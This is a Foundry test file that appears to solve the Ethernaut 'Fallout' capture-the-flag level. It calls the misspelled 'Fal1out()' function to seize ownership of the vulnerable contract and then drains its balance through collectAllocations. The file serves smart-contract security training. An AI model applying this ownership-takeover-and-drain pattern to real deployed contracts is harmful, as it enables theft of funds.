pragma solidity ^0.8.0;

import "src/levels/02Fallout/Fallout.sol";
import "src/levels/02Fallout/FalloutFactory.sol";
import "src/core/Ethernaut.sol";
import "forge-std/Test.sol";
import "forge-std/Vm.sol";

contract TestFallout is Test{
    Ethernaut ethernaut = new Ethernaut();
    address myEoa = 0xB5Da00630Ca5fdE4d9cED2fcdA0C607cE198F159;
    function setUp() public {
        vm.deal(myEoa, 1000 ether);
    }

    function testFallout() public {
        FalloutFactory fallbackFactory = new FalloutFactory();
        ethernaut.registerLevel(fallbackFactory);
        address instanceAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallout fallout = Fallout(payable(instanceAddress));
        vm.startPrank(myEoa);
        instanceAddress.call{value: 1 wei}(abi.encodeWithSignature("Fal1out()"));
        assertEq(fallout.owner(), myEoa);
        fallout.collectAllocations();
        assertEq(address(fallout).balance, 0);
        vm.stopPrank();
    }
}